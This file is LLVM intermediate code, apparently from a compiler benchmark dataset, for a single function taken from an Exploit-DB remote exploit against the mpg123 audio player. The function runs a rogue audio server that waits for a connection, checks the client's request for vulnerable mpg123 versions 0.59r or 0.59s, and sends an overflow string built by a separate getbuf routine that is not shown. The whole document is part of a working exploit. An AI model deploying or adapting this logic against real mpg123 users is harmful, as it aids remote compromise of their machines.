; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_23171.c_audioserver_bind.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_23171.c_audioserver_bind.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.TYPE_2__, i32, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [46 x i8] c"audioserver_bind(): allocating memory failed.\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@SOL_SOCKET = common dso_local global i32 0, align 4
@SO_REUSEADDR = common dso_local global i32 0, align 4
@port = common dso_local global i32 0, align 4
@INADDR_ANY = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [23 x i8] c"could not bind socket.\00", align 1
@.str.2 = private unnamed_addr constant [37 x i8] c"[*] awaiting connection from: *:%d.\0A\00", align 1
@.str.3 = private unnamed_addr constant [47 x i8] c"[*] audio server connection established. (%s)\0A\00", align 1
@.str.4 = private unnamed_addr constant [60 x i8] c"[*] waiting for request information, to verify the client.\0A\00", align 1
@.str.5 = private unnamed_addr constant [13 x i8] c"mpg123/0.59r\00", align 1
@.str.6 = private unnamed_addr constant [13 x i8] c"mpg123/0.59s\00", align 1
@.str.7 = private unnamed_addr constant [59 x i8] c"[*] client is running an exploitable version, continuing.\0A\00", align 1
@.str.8 = private unnamed_addr constant [60 x i8] c"[!] client is not running an exploitable version, skipped.\0A\00", align 1
@.str.9 = private unnamed_addr constant [59 x i8] c"[*] sending the string to exploit the overflow condition.\0A\00", align 1
@.str.10 = private unnamed_addr constant [37 x i8] c"[*] closed audio server connection.\0A\00", align 1
@SO_REUSEPORT = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i8* @audioserver_bind() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %3, align 4
  store i32 1, i32* %4, align 4
  %8 = call i64 @malloc(i32 1025)
  %9 = inttoptr i64 %8 to i8*
  store i8* %9, i8** %5, align 8
  %10 = icmp ne i8* %9, null
  br i1 %10, label %13, label %11

11:                                               ; preds = %0
  %12 = call i32 @printe(i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str, i64 0, i64 0), i32 1)
  br label %13

13:                                               ; preds = %11, %0
  %14 = load i32, i32* @AF_INET, align 4
  %15 = load i32, i32* @SOCK_STREAM, align 4
  %16 = load i32, i32* @IPPROTO_TCP, align 4
  %17 = call i32 @socket(i32 %14, i32 %15, i32 %16)
  store i32 %17, i32* %2, align 4
  %18 = load i32, i32* %2, align 4
  %19 = load i32, i32* @SOL_SOCKET, align 4
  %20 = load i32, i32* @SO_REUSEADDR, align 4
  %21 = bitcast i32* %4 to i8*
  %22 = call i32 @setsockopt(i32 %18, i32 %19, i32 %20, i8* %21, i32 4)
  %23 = load i32, i32* @AF_INET, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  store i32 %23, i32* %24, align 4
  %25 = load i32, i32* @port, align 4
  %26 = call i32 @htons(i32 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  store i32 %26, i32* %27, align 4
  %28 = load i32, i32* @INADDR_ANY, align 4
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  %30 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %29, i32 0, i32 0
  store i32 %28, i32* %30, align 4
  %31 = load i32, i32* %2, align 4
  %32 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %33 = call i32 @bind(i32 %31, %struct.sockaddr* %32, i32 12)
  %34 = icmp eq i32 %33, -1
  br i1 %34, label %35, label %37

35:                                               ; preds = %13
  %36 = call i32 @printe(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.1, i64 0, i64 0), i32 1)
  br label %37

37:                                               ; preds = %35, %13
  br label %38

38:                                               ; preds = %75, %37
  %39 = load i32, i32* %2, align 4
  %40 = icmp ne i32 %39, 0
  br i1 %40, label %41, label %76

41:                                               ; preds = %38
  %42 = load i32, i32* @port, align 4
  %43 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.2, i64 0, i64 0), i32 %42)
  %44 = load i32, i32* %2, align 4
  %45 = call i32 @listen(i32 %44, i32 1)
  %46 = bitcast %struct.sockaddr_in* %7 to i8*
  %47 = call i32 @bzero(i8* %46, i32 12)
  store i32 12, i32* %1, align 4
  %48 = load i32, i32* %2, align 4
  %49 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %50 = call i32 @accept(i32 %48, %struct.sockaddr* %49, i32* %1)
  store i32 %50, i32* %3, align 4
  %51 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  %52 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %51, i32 0, i32 0
  %53 = load i32, i32* %52, align 4
  %54 = call i8* @inet_ntoa(i32 %53)
  %55 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.3, i64 0, i64 0), i8* %54)
  %56 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.4, i64 0, i64 0))
  %57 = load i32, i32* %3, align 4
  %58 = load i8*, i8** %5, align 8
  %59 = call i32 @read(i32 %57, i8* %58, i32 1024)
  %60 = load i8*, i8** %5, align 8
  %61 = call i64 @strstr(i8* %60, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.5, i64 0, i64 0))
  %62 = icmp ne i64 %61, 0
  br i1 %62, label %67, label %63

63:                                               ; preds = %41
  %64 = load i8*, i8** %5, align 8
  %65 = call i64 @strstr(i8* %64, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.6, i64 0, i64 0))
  %66 = icmp ne i64 %65, 0
  br i1 %66, label %67, label %71

67:                                               ; preds = %63, %41
  %68 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.7, i64 0, i64 0))
  %69 = load i32, i32* %2, align 4
  %70 = call i32 @close(i32 %69)
  store i32 0, i32* %2, align 4
  br label %75

71:                                               ; preds = %63
  %72 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.8, i64 0, i64 0))
  %73 = load i32, i32* %3, align 4
  %74 = call i32 @close(i32 %73)
  br label %75

75:                                               ; preds = %71, %67
  br label %38

76:                                               ; preds = %38
  %77 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.9, i64 0, i64 0))
  %78 = load i32, i32* %3, align 4
  %79 = call i32 (...) @getbuf()
  %80 = call i32 (...) @getbuf()
  %81 = call i32 @strlen(i32 %80)
  %82 = call i32 @write(i32 %78, i32 %79, i32 %81)
  %83 = call i32 @sleep(i32 1)
  %84 = load i32, i32* %3, align 4
  %85 = call i32 @close(i32 %84)
  %86 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.10, i64 0, i64 0))
  %87 = load i8*, i8** %5, align 8
  %88 = call i32 @free(i8* %87)
  %89 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  %90 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %89, i32 0, i32 0
  %91 = load i32, i32* %90, align 4
  %92 = call i8* @inet_ntoa(i32 %91)
  ret i8* %92
}

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @printe(i8*, i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @setsockopt(i32, i32, i32, i8*, i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @bind(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @listen(i32, i32) #1

declare dso_local i32 @bzero(i8*, i32) #1

declare dso_local i32 @accept(i32, %struct.sockaddr*, i32*) #1

declare dso_local i8* @inet_ntoa(i32) #1

declare dso_local i32 @read(i32, i8*, i32) #1

declare dso_local i64 @strstr(i8*, i8*) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @write(i32, i32, i32) #1

declare dso_local i32 @getbuf(...) #1

declare dso_local i32 @strlen(i32) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @free(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
